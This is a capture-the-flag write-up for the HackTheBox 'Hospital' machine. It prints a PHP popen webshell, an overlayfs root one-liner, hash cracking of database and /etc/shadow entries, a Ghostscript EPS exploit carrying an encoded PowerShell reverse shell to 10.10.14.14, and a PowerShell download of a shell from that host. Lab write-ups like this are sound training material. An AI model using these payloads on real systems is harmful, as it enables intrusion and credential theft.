---
title: Hospital HTB (English)
img_path: /assets/img/Anexos/
image: /assets/img/Anexos/Máquina%20Hospital.png
description: Hospital HTB Machine [Difuculty medium]
categories: [CTF,HackTheBox]
tags: [hacking,easy]
---



## Introduction
Hospital is a medium-difficulty Windows machine that hosts an Active Directory environment, a web server, and a `RoundCube` instance. The web application has a file upload vulnerability that allows the execution of arbitrary PHP code, leading to a reverse shell on the Linux virtual machine hosting the service. Enumerating the system reveals an outdated Linux kernel that can be exploited to gain root privileges, via `[CVE-2023-35001](https://nvd.nist.gov/vuln/detail/CVE-2023-35001)`. Privileged access allows `/etc/shadow` hashes to be read and subsequently cracked, yielding credentials for the `RoundCube` instance. Emails on the service hint towards the use of `GhostScript`, which opens up the target to exploitation via `[CVE-2023-36664](https://nvd.nist.gov/vuln/detail/CVE-2023-36664)`, a vulnerability exploited by crafting a malicious Embedded PostScript (EPS) file to achieve remote code execution on the Windows host. System access is then obtained by either of two ways: using a keylogger to capture `administrator` credentials, or by abusing misconfigured `XAMPP` permissions.

### Machine Description

![](Máquina%20Hospital-33.png)

- Name: Hospital
- Goal: Get two flags
- Difficulty: medium
- Operating System: Windows
- link: [Hospital](https://app.hackthebox.com/machines/Hospital)

  

### PDF Link
- PDF: [Link to PDF](https://github.com/juanbelin/Writeups-CTFs-Challenges/blob/main/Dockerlabs/M%C3%A1quina%20Hospital.pdf)





## Reconnaissance 
We start using `nmap` to know ports and services running

```shell
❯ nmap -sSCV --min-rate 5000 -p- --open 10.10.11.241 -oN scan1.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-24 10:12 CEST
Stats: 0:00:53 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 96.82% done; ETC: 10:12 (0:00:02 remaining)
Nmap scan report for 10.10.11.241
Host is up (1.3s latency).
Not shown: 65506 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE           VERSION
22/tcp    open  ssh               OpenSSH 9.0p1 Ubuntu 1ubuntu8.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 e1:4b:4b:3a:6d:18:66:69:39:f7:aa:74:b3:16:0a:aa (ECDSA)
|_  256 96:c1:dc:d8:97:20:95:e7:01:5f:20:a2:43:61:cb:ca (ED25519)
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-05-24 15:13:10Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
443/tcp   open  ssl/http          Apache httpd 2.4.56 ((Win64) OpenSSL/1.1.1t PHP/8.0.28)
| tls-alpn: 
|_  http/1.1
|_http-title: Hospital Webmail :: Welcome to Hospital Webmail
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_http-server-header: Apache/2.4.56 (Win64) OpenSSL/1.1.1t PHP/8.0.28
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
1801/tcp  open  msmq?
2103/tcp  open  msrpc             Microsoft Windows RPC
2105/tcp  open  msrpc             Microsoft Windows RPC
2107/tcp  open  msrpc             Microsoft Windows RPC
2179/tcp  open  vmrdp?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: hospital.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3269/tcp  open  globalcatLDAPssl?
| ssl-cert: Subject: commonName=DC
| Subject Alternative Name: DNS:DC, DNS:DC.hospital.htb
| Not valid before: 2023-09-06T10:49:03
|_Not valid after:  2028-09-06T10:49:03
3389/tcp  open  ms-wbt-server     Microsoft Terminal Services
| rdp-ntlm-info: 
|   Target_Name: HOSPITAL
|   NetBIOS_Domain_Name: HOSPITAL
|   NetBIOS_Computer_Name: DC
|   DNS_Domain_Name: hospital.htb
|   DNS_Computer_Name: DC.hospital.htb
|   DNS_Tree_Name: hospital.htb
|   Product_Version: 10.0.17763
|_  System_Time: 2025-05-24T15:14:52+00:00
| ssl-cert: Subject: commonName=DC.hospital.htb
| Not valid before: 2025-05-23T01:40:56
|_Not valid after:  2025-11-22T01:40:56
5985/tcp  open  http              Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6404/tcp  open  msrpc             Microsoft Windows RPC
6406/tcp  open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
6407/tcp  open  msrpc             Microsoft Windows RPC
6409/tcp  open  msrpc             Microsoft Windows RPC
6613/tcp  open  msrpc             Microsoft Windows RPC
6633/tcp  open  msrpc             Microsoft Windows RPC
8080/tcp  open  http              Apache httpd 2.4.55 ((Ubuntu))
|_http-server-header: Apache/2.4.55 (Ubuntu)
|_http-open-proxy: Proxy might be redirecting requests
| http-title: Login
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
9389/tcp  open  mc-nmf            .NET Message Framing
28553/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OSs: Linux, Windows; CPE: cpe:/o:linux:linux_kernel, cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-time: 
|   date: 2025-05-24T15:14:48
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 210.39 seconds
```

Nmap reported us a bunch of ports and services. We have two domains that we can note in _/etc/hosts_

![](Máquina%20Hospital-3.png)
Apparently is Linux, but some services do not say the same, we can verify it doing a ping

```shell
❯ ping 10.10.11.241
PING 10.10.11.241 (10.10.11.241) 56(84) bytes of data.
64 bytes from 10.10.11.241: icmp_seq=1 ttl=127 time=40.4 ms
64 bytes from 10.10.11.241: icmp_seq=2 ttl=127 time=1187 ms
64 bytes from 10.10.11.241: icmp_seq=3 ttl=127 time=158 ms
```

The ttl is _127_ so probably is a Linux inside a Windows. 

At https we se a Webmail, nothing to do here for now.

![](Máquina%20Hospital-4.png)

At http we a login, we can enumerate users when creating an account but for know lets make an account.
![](Máquina%20Hospital-5.png)

![](Máquina%20Hospital-6.png)

![](Máquina%20Hospital-7.png)


Once in, we can only upload files so lets do it:
![](Máquina%20Hospital-8.png)

We can only upload png files and they all are storage in /uploads directory
![](Máquina%20Hospital-9.png)


![](Máquina%20Hospital-10.png)

Trying we see that a withe list exists so we can fuzz extensions using `fuff`


![](Máquina%20Hospital-11.png)

![](Máquina%20Hospital-12.png)

![](Máquina%20Hospital-13.png)


```shell
ffuf -request hospital.req -request-proto http -w /usr/share/wordlists/seclists/Fuzzing/extensions-most-common.fuzz.txt -mr success
```


```shell
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Regexp: success
________________________________________________

phar                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1230ms]
txt                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 1272ms]
shtm                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 554ms]
phtm                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 768ms]
:: Progress: [31/31] :: Job [1/1] :: 2 req/sec :: Duration: [0:00:20] :: Errors: 25 ::
```

After the fuzzing, we know now that we can upload phar and phtm files which can execute php so lets try:
![](Máquina%20Hospital-14.png)

![](Máquina%20Hospital-15.png)

We cannot see the output so lets see phpinfo

![](Máquina%20Hospital-16.png)


![](Máquina%20Hospital-17.png)

A bunch of functions are disabled. In order to bypass this y use the next dangerous extensions dictionary and using php I can see which one are enabled. 

> https://github.com/teambi0s/dfunc-bypasser

```php
<?php

$functions = array('pcntl_alarm','pcntl_fork','pcntl_waitpid','pcntl_wait','pcntl_wifexited','pcntl_wifstopped','pcntl_wifsignaled','pcntl_wifcontinued','pcntl_wexitstatus','pcntl_wtermsig','pcntl_wstopsig','pcntl_signal','pcntl_signal_get_handler','pcntl_signal_dispatch','pcntl_get_last_error','pcntl_strerror','pcntl_sigprocmask','pcntl_sigwaitinfo','pcntl_sigtimedwait','pcntl_exec','pcntl_getpriority','pcntl_setpriority','pcntl_async_signals','error_log','system','exec','shell_exec','popen','proc_open','passthru','link','symlink','syslog','ld','mail');

foreach ($functions as $f) {
  if (function_exists($f)) {
    echo $f . " exists<br>\n";
  }
}

?>
```

![](Máquina%20Hospital-18.png)





## Explotation 

We can use `popen` function to command execution
```php
<?php
$fp = popen(base64_decode($_GET['cm']),"r");{while(!feof($fp)){$result.=fread($fp,1024);}pclose($fp);}$exec = convert_cyr_string($result,"d","w");echo $exec;
?>
```

![](Máquina%20Hospital-19.png)

And now the reverse shell
![](Máquina%20Hospital-20.png)

![](Máquina%20Hospital-21.png)






## Privilage Escalation  
Once we're in The Linux machine we can see the mysql root password in the _config.php_ file 
![](Máquina%20Hospital-24.png)

![](Máquina%20Hospital-23.png)

```shell
MariaDB [(none)]> show databases;
+--------------------+
| Database           |
+--------------------+
| hospital           |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.008 sec)

MariaDB [(none)]> use hospital;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
MariaDB [hospital]> show tables;
+--------------------+
| Tables_in_hospital |
+--------------------+
| users              |
+--------------------+
1 row in set (0.000 sec)

MariaDB [hospital]> select * form users;
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near 'form users' at line 1
MariaDB [hospital]> select * from users;
+----+----------+--------------------------------------------------------------+---------------------+
| id | username | password                                                     | created_at          |
+----+----------+--------------------------------------------------------------+---------------------+
|  1 | admin    | $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2 | 2023-09-21 14:46:04 |
|  2 | patient  | $2y$10$a.lNstD7JdiNYxEepKf1/OZ5EM5wngYrf.m5RxXCgSud7MVU6/tgO | 2023-09-21 15:35:11 |
|  3 | test     | $2y$10$d.PTmSHZ8Wre4ajdh7K.2.Mxql8Y3GMxAqbAfqi0whxO/uLGlXu3O | 2025-05-24 03:01:46 |
|  4 | belin    | $2y$10$4Z7K4TM3l607CcUo9LBQFuE1XM.CCl4pW1I9XDai7xjjPR5aLA2AO | 2025-05-24 15:32:13 |
+----+----------+--------------------------------------------------------------+---------------------+
4 rows in set (0.000 sec)
```

Once we have the users's hashes we could try to crack them using `hashcat`

```shell
hashcat --user -m 3200 hash /usr/share/wordlists/rockyou.txt
```

```shell
$2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3NLrxcjMh2:123456
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 3200 (bcrypt $2*$, Blowfish (Unix))
Hash.Target......: $2y$10$caGIEbf9DBF7ddlByqCkrexkt0cPseJJ5FiVO1cnhG.3...xcjMh2
Time.Started.....: Sun May 25 09:32:26 2025 (2 secs)
Time.Estimated...: Sun May 25 09:32:28 2025 (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:      564 H/s (9.06ms) @ Accel:2 Loops:8 Thr:11 Vec:1
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 660/14344384 (0.00%)
Rejected.........: 0/660 (0.00%)
Restore.Point....: 0/14344384 (0.00%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:1016-1024
Candidate.Engine.: Device Generator
Candidates.#1....: 123456 -> cheyenne
Hardware.Mon.#1..: Temp: 44c Fan: 33% Util: 80% Core:1980MHz Mem:6801MHz Bus:16

Started: Sun May 25 09:32:21 2025
Stopped: Sun May 25 09:32:29 2025
```

We've got the admin password but we can't do nothing because in the machine there is no admin user but rather drwilliams


```shell
root:x:0:0:root:/root:/bin/bash
drwilliams:x:1000:1000:Lucy Williams:/home/drwilliams:/bin/bash
www-data@webserver:/var/www/html$ cat /etc/passwd | grep bash
```


After a while I release the kernel is vulnerable so I exploit it using this reddit post:
```shell
www-data@webserver:/var/www/html$ uname -a
Linux webserver 5.19.0-35-generic #36-Ubuntu SMP PREEMPT_DYNAMIC Fri Feb 3 18:36:56 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
```

>https://www.reddit.com/r/selfhosted/comments/15ecpck/ubuntu_local_privilege_escalation_cve20232640/


```shell
www-data@webserver:/var/www/html$ unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
> setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("id")'
uid=0(root) gid=33(www-data) groups=33(www-data)
```

```shell
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("chmod +s /bin/bash")'
```

```shell
www-data@webserver:/var/www/html$ ls -l /bin/bash
-rwsr-sr-x 1 root root 1437832 Jan  7  2023 /bin/bash
```

```shell
www-data@webserver:/var/www/html$ /bin/bash -p
bash-5.2# id
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=0(root),33(www-data)
```

Once we're root, what we can do is read the shadow file in order to get drwilliams's  hash and crack it using `hashcat` again

```shell
drwilliams:$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:19612:0:99999:7:::
```

```shell
❯ hashcat --user hash /usr/share/wordlists/rockyou.txt
```

```shell
$6$uWBSeTcoXXTBRkiL$S9ipksJfiZuO4bFI6I9w/iItu5.Ohoz3dABeF6QWumGBspUW378P1tlwak7NqzouoRTbrz6Ag0qcyGQxW192y/:qwe123!@#
```
We've got the drwilliams password and we can now go back and login in the webmail


![](Máquina%20Hospital-25.png)

![](Máquina%20Hospital-26.png)

In the webmail there is a mail from drbrown telling to us that we need to upload and .eps file to resume the project.  I used the next exploit to make a malicious eps:

> https://github.com/jakabakos/CVE-2023-36664-Ghostscript-command-injection

```shell
python3 CVE_2023_36664_exploit.py --generate --payload "powershell -e JABjAGwAaQBlAG4AdAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFMAbwBjAGsAZQB0AHMALgBUAEMAUABDAGwAaQBlAG4AdAAoACIAMQAwAC4AMQAwAC4AMQA0AC4AMQA0ACIALAA0ADQAMwApADsAJABzAHQAcgBlAGEAbQAgAD0AIAAkAGMAbABpAGUAbgB0AC4ARwBlAHQAUwB0AHIAZQBhAG0AKAApADsAWwBiAHkAdABlAFsAXQBdACQAYgB5AHQAZQBzACAAPQAgADAALgAuADYANQA1ADMANQB8ACUAewAwAH0AOwB3AGgAaQBsAGUAKAAoACQAaQAgAD0AIAAkAHMAdAByAGUAYQBtAC4AUgBlAGEAZAAoACQAYgB5AHQAZQBzACwAIAAwACwAIAAkAGIAeQB0AGUAcwAuAEwAZQBuAGcAdABoACkAKQAgAC0AbgBlACAAMAApAHsAOwAkAGQAYQB0AGEAIAA9ACAAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBUAHkAcABlAE4AYQBtAGUAIABTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBBAFMAQwBJAEkARQBuAGMAbwBkAGkAbgBnACkALgBHAGUAdABTAHQAcgBpAG4AZwAoACQAYgB5AHQAZQBzACwAMAAsACAAJABpACkAOwAkAHMAZQBuAGQAYgBhAGMAawAgAD0AIAAoAGkAZQB4ACAAJABkAGEAdABhACAAMgA+ACYAMQAgAHwAIABPAHUAdAAtAFMAdAByAGkAbgBnACAAKQA7ACQAcwBlAG4AZABiAGEAYwBrADIAIAA9ACAAJABzAGUAbgBkAGIAYQBjAGsAIAArACAAIgBQAFMAIAAiACAAKwAgACgAcAB3AGQAKQAuAFAAYQB0AGgAIAArACAAIgA+ACAAIgA7ACQAcwBlAG4AZABiAHkAdABlACAAPQAgACgAWwB0AGUAeAB0AC4AZQBuAGMAbwBkAGkAbgBnAF0AOgA6AEEAUwBDAEkASQApAC4ARwBlAHQAQgB5AHQAZQBzACgAJABzAGUAbgBkAGIAYQBjAGsAMgApADsAJABzAHQAcgBlAGEAbQAuAFcAcgBpAHQAZQAoACQAcwBlAG4AZABiAHkAdABlACwAMAAsACQAcwBlAG4AZABiAHkAdABlAC4ATABlAG4AZwB0AGgAKQA7ACQAcwB0AHIAZQBhAG0ALgBGAGwAdQBzAGgAKAApAH0AOwAkAGMAbABpAGUAbgB0AC4AQwBsAG8AcwBlACgAKQA=" --filename projecy --extension eps   
```


![](Máquina%20Hospital-27.png)

Waiting drbrown to open the mail, we listen and we get the reverse shell 

![](Máquina%20Hospital-28.png)
Now we're in the Windows. At C:\ we see xampp running

![](Máquina%20Hospital-29.png)
Maybe the admin is running xampp, who knows? So firts lets see if we have permissions in htdocs 

```powershell
PS C:\xampp> icacls htdocs
htdocs NT AUTHORITY\LOCAL SERVICE:(OI)(CI)(F)
       NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
       BUILTIN\Administrators:(I)(OI)(CI)(F)
       BUILTIN\Users:(I)(OI)(CI)(RX)
       BUILTIN\Users:(I)(CI)(AD)
       BUILTIN\Users:(I)(CI)(WD)
       CREATOR OWNER:(I)(OI)(CI)(IO)(F)
```

We do, so know we make this php in order to know who is running the service

```php
cat shell.php
───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────────────
       │ File: shell.php
───────┼──────────────────────────────────────────────────────────────────────────────────────────────────────────────
   1   │ <?php
   2   │ 
   3   │ shell_exec("whoami");
   4   │ 
   5   │ ?>
───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

We can transfer the file using base64:

```shell
❯ cat shell.php |base64 -w 0;echo

PD9waHAKCnNoZWxsX2V4ZWMoIndob2FtaSIpOwoKPz4K
```


```powershell
PS C:\> [IO.File]::WriteAllBytes("C:\xampp\htdocs\shell.php",[Convert]::FromBase64String("PD9waHAKCnNoZWxsX2V4ZWMoIndob2FtaSIpOwoKPz4K"))
```

![](Máquina%20Hospital-30.png)

nt authority\system is running the service so lets make an reverse shell 

```shell
PS C:\xampp\htdocs>  (New-Object Net.WebClient).DownloadFile('http://10.10.14.14/shell.php','C:\xampp\htdocs\shell.php')
```

![](Máquina%20Hospital-31.png)

![](Máquina%20Hospital-32.png)

And we are root in Windows.